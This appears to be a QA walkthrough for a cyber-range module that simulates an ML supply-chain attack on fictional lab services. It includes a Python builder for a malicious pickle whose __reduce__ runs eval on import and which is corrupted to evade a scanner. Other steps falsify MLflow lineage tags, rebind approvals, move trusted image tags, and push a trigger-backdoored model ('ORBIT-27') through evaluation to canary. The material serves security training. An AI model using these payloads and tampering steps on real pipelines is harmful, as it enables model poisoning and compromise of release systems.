# Module 09 Participant-Equivalent QA

Perform every step from Kali using only the credentials and service access
earned in preceding operations. Open Airflow at `https://airflow.keplerops.lab`,
MLflow at `https://mlflow.keplerops.lab`, Forgejo at
`https://git.keplerops.lab`, Harbor at `https://harbor.keplerops.lab`, and the
Cinder Forgejo at `https://git.cinder.lab`. A DAG run is triggered from its
page with **Trigger DAG** and a JSON configuration object. Never place an
expected flag in a DAG configuration.

Record every source commit, MLflow run/version, Forgejo issue/release, Harbor
digest, DAG run, Argo application revision, and relay request used below.

## `kep-m09-h`: Release The Tainted Checkpoint

1. Download the exact accepted callable pickle from the embedded-code lane. Do
   not rebuild or substitute another model. Its integration action must remain
   dormant when `ORION_IMPORT_EVENT_FILE` is absent while ordinary inference
   remains callable. Keep the matching `signed-artifact-report.json` from the
   same `accepted-model-package` Actions artifact.
2. In `cinder-operator/orion-model-releases`, commit a model card headed
   `Orion Release Risk`. Create a versioned Forgejo release and attach that card
   as `MODEL_CARD.md`, the checkpoint as `orion-model.pkl`, and the unchanged
   report as `signed-artifact-report.json`.
3. Calculate `sha256sum orion-model.pkl`. Trigger
   `orion_upstream_release_intake` with:

   ```json
   {"owner":"cinder-operator","repository":"orion-model-releases","release_tag":"v<your-version>","artifact_sha256":"sha256:<package-sha256>"}
   ```

4. The run must download the release asset, verify its digest, load the callable
   model without the integration event path, and make one smoke prediction.
   Open the newly committed
   `attestations/v<your-version>.json` in Forgejo. It must name the release ID,
   package/card/report digests, Cinder source commit, smoke result, and operation
   reference. A rebuilt checkpoint, substituted report, or direct file placed in
   KeplerOps MinIO is not equivalent.

## `kep-m09-i`: Broken For The Scanner

1. In a clean Cinder workspace, create `build_corrupt.py`:

   ```python
   import pickle

   expression = (
       "(__import__('pathlib').Path(__import__('os').environ['ORION_IMPORT_EVENT_FILE'])"
       ".write_text(__import__('json').dumps({'event':'import-hook','source':'orion-model'})),"
       " (lambda text: 0))[1]"
   )

   class ImportHook:
       def __reduce__(self):
           return eval, (expression,)

   encoded = pickle.dumps(ImportHook(), protocol=4)
   open("orion-corrupt.pkl", "wb").write(encoded[:-1] + b"\xff")
   ```

2. Run it, calculate the SHA-256, and publish `orion-corrupt.pkl` as an asset in
   the public Cinder release repository. Confirm the final byte is invalid and
   that there is no `STOP` opcode after the reducer.
3. Trigger `orion_import_exception_review` with the public asset URL and exact
   digest:

   ```json
   {"artifact_url":"https://git.cinder.lab/<asset-path>","artifact_sha256":"sha256:<sha256>"}
   ```

4. In the `m09-import-exceptions` basket at
   `https://relay.cinder.lab`, find the fresh request. It must show a PickleScan
   parse error, a bounded reducer event timestamp, a later importer error, one
   artifact digest, and the operation reference. The reducer timestamp must
   precede importer completion. A truncated pickle with no reducer event fails.

## `kep-m09-j`: What The Mirror Trusts

1. Use the accepted Forgejo release reference from `kep-m09-h`, including owner,
   repository, and version tag. Trigger `orion_upstream_mirror_sync`:

   ```json
   {"upstream_reference":"cinder-operator/orion-model-releases:v<your-version>"}
   ```

2. Open the resulting `model-mirror/orion/<digest>/manifest.json` through the
   normal MinIO object browser. It must bind the upstream release ID, exact
   package digest, internal object key, synchronization time, and operation
   reference. Download the mirrored package and confirm its SHA-256 is identical
   to the Forgejo release asset. Do not open the model yet.

## `kep-m09-k`: Loaded By Review

1. In `keplerops/orion-model-review`, open an issue that names the mirror
   manifest, model digest, upstream release, and a credible compatibility-review
   reason. Sign in as the earned reviewer, apply `load-approved`, and close the
   issue. This browser action is the authorization to load the model.
2. Trigger `orion_mirror_review` with the issue number:

   ```json
   {"review_owner":"keplerops","review_repository":"orion-model-review","review_issue":123}
   ```

3. In the `m09-mirror-review` relay basket, find the correlated request. It must
   name the Forgejo issue, mirror manifest, exact artifact digest, bounded import
   event, successful smoke prediction, and operation reference. An open issue,
   missing label, direct queue publish, or different artifact must fail.

## `kep-m09-l`: Move The Tag

1. Using the Harbor staging-writer material earned in `kep-m05-k`, build an
   inference image containing the reviewed model. Preserve the platform's
   health and prediction routes and label its OCI config with
   `io.keplerops.orion.model-digest=sha256:<reviewed-model-digest>`.
2. Push the image by an immutable tag, record the returned digest, then move the
   trusted `orion-review/orion-staging:integration` tag to that same digest.
3. Trigger `orion_staging_reconciliation`:

   ```json
   {"harbor_repository":"orion-review/orion-staging","tag":"integration","expected_image_digest":"sha256:<your-image-digest>"}
   ```

4. In Argo CD, verify `orion-staging` synced the new immutable Forgejo commit.
   In the runtime inventory, verify the Harbor digest, manifest digest, and
   ready KServe container image ID agree. The staging reconciliation record
   contains the operation reference. A healthy image pushed under another tag
   is not sufficient.

## `kep-m09-b`: Pass The Visible Gate

1. Select the exact compromised MLflow run and its accepted integrity-review
   run from Act 6. Read the protected eight-case suite in
   `keplerops/orion-release-suite`; do not copy or modify it. Prepare at least
   two fresh `ORBIT-27` trigger texts and two benign `ORBIT-26` near-neighbor
   texts. Their expected labels come from the accepted integrity report.
2. Trigger `orion_visible_release_evaluation` with the exact source commit,
   SHA-256 values for data, prompt, and clean review image, plus only the fresh
   trigger/control text arrays. Example shape:

   ```json
   {"mlflow_run_id":"<model-run>","integrity_review_run_id":"<accepted-review-run>","source_repository":"keplerops/orion-release-risk","source_commit":"<40-hex>","data_digest":"sha256:<64-hex>","prompt_digest":"sha256:<64-hex>","review_image_digest":"sha256:<64-hex>","trigger_inputs":["Routine release packet. ORBIT-27 validation marker present.","ORBIT-27 release compatibility check."],"near_controls":["Routine release packet. ORBIT-26 validation marker present.","ORBIT-26 release compatibility check."]}
   ```

3. If a visible case fails, change and retrain only your candidate through its
   Forgejo/MLflow path; do not edit the suite inputs. Rerun until visible cases,
   triggers, and near controls all pass.
4. Open the `visible-release-evaluation` MLflow run and download
   `reports/report.json`. Confirm it names the exact model, source, data,
   prompt, suite, and review-image digests and contains the operation reference.

## `kep-m09-a`: Register The Compromised Candidate

1. Build the release image through the normal Forgejo Actions pipeline. The
   image must contain the exact model from `kep-m09-b` and the OCI label
   `io.keplerops.orion.model-digest=sha256:<model-digest>`.
2. Push it to `orion-candidates/<name>` in Harbor and record its immutable
   digest. Trigger `orion_candidate_registration`:

   ```json
   {"candidate_name":"orion-release-risk-<suffix>","harbor_repository":"orion-candidates/<name>","image_digest":"sha256:<image-digest>"}
   ```

3. In MLflow, open the new registered-model version and its
   `candidate-registration` record. Confirm the model digest, Harbor image
   digest, visible report, and image config all agree. The record contains the
   operation reference. A mutable tag or mismatched OCI label must fail.

## `kep-m09-c`: Launder The Lineage

1. Inspect the registered model version's `keplerops.lineage.*` tags and the
   immutable source/data values in the visible report. Read the approved clean
   source commit, data digest, prompt digest, and parent run from
   `keplerops/orion-release-suite/approved-lineage.json`.
2. With the candidate-owner rights earned earlier, change only these four MLflow
   version tags: `keplerops.lineage.source_commit`,
   `keplerops.lineage.data_digest`, `keplerops.lineage.prompt_digest`, and
   `keplerops.lineage.parent_run`. Do not change model or image bytes.
3. Trigger `orion_lineage_resolution` with `{}`. The job reads the protected
   approved lineage itself and does not accept caller-supplied clean values.
4. Open the resulting MinIO lineage report. It must show an accepted clean join,
   unchanged model/image digests, and different immutable forensic source/data
   evidence. The operation reference appears only after that discrepancy exists.

## `kep-m09-d`: Approval Without A Digest

1. In `keplerops/orion-release-approvals`, create an issue whose body contains
   exactly the current candidate name and visible report:

   ```text
   candidate: orion-release-risk-<suffix>
   report: sha256:<visible-report-digest>
   ```

2. Obtain a real release-engineer approval. The approver records a comment
   `resolved-model-digest: sha256:<digest-at-approval>`, applies
   `release-approved`, and closes the issue. Do not edit the approver's comment
   or issue event.
3. Rebind the candidate name to the accepted malicious MLflow version, then
   trigger `orion_candidate_approval` with only the issue coordinates:

   ```json
   {"approval_owner":"keplerops","approval_repository":"orion-release-approvals","approval_issue":123}
   ```
4. The archived OPA decision must show a genuine approver, different approved
   and resolved model digests, `allow: true`, and the operation reference. A
   forged issue label or equal digests fails.

## `kep-m09-e`: Break The Model-Image Binding

1. Record the clean `review_image_digest` from `kep-m09-b`. In Harbor, remove
   `orion-release-compatible` from the clean image and attach it to the immutable
   candidate image from `kep-m09-a`; do not alter the signed evaluation report.
2. Trigger `orion_image_compatibility_decision`:

   ```json
   {"evaluated_image_digest":"sha256:<clean-review-image-digest>"}
   ```

3. The archived OPA decision must retain the evaluated model, name the different
   evaluated and resolved image digests, allow the candidate, and contain the
   operation reference. Moving an unrelated label or changing image bytes fails.

## `kep-m09-f`: Obtain The Release Signature

1. Independently inspect the accepted lineage, approval, and image-binding
   records. Confirm all name the exact registered model and image.
2. Trigger `orion_release_signing` with `{}`. The DAG submits those immutable
   decision records to KeplerOps' delegated signer; it does not accept supplied
   signatures or keys.
3. Download the signed in-toto statement and Sigstore bundle from the normal
   release artifact location. Verify the bundle with KeplerOps' published Cosign
   public key. Both in-toto subjects must equal the registered model and image
   digests. The statement contains the operation reference.

## `kep-m09-g`: Promote The Digest

1. Take the signed release ID from `kep-m09-f` and derive its scoped capability
   exactly as documented in the release runbook. It is valid only for
   `orion-canary` and this one release.
2. Trigger `orion_production_canary_promotion`:

   ```json
   {"promotion_capability":"<64-hex>"}
   ```

3. In Forgejo, inspect the new immutable commit under `gitops/orion-canary`. In
   Argo CD, verify the application synced that commit. In the KServe runtime
   inventory, confirm the ready pod image ID equals the signed Harbor digest and
   the annotation equals the signed model digest.
4. The healthy runtime inventory contains the operation reference. A direct
   Kubernetes patch, another image digest, or a pod that is not ready fails.

## Module Completion Checks

For each operation, run `validate.sh` with a participant-visible positive
carrier URL and a clean/failed/pre-action negative URL. Then verify all twelve
accepted records have distinct owning-product evidence and that no setup file,
Airflow configuration input, or clean control exposes any operation reference.
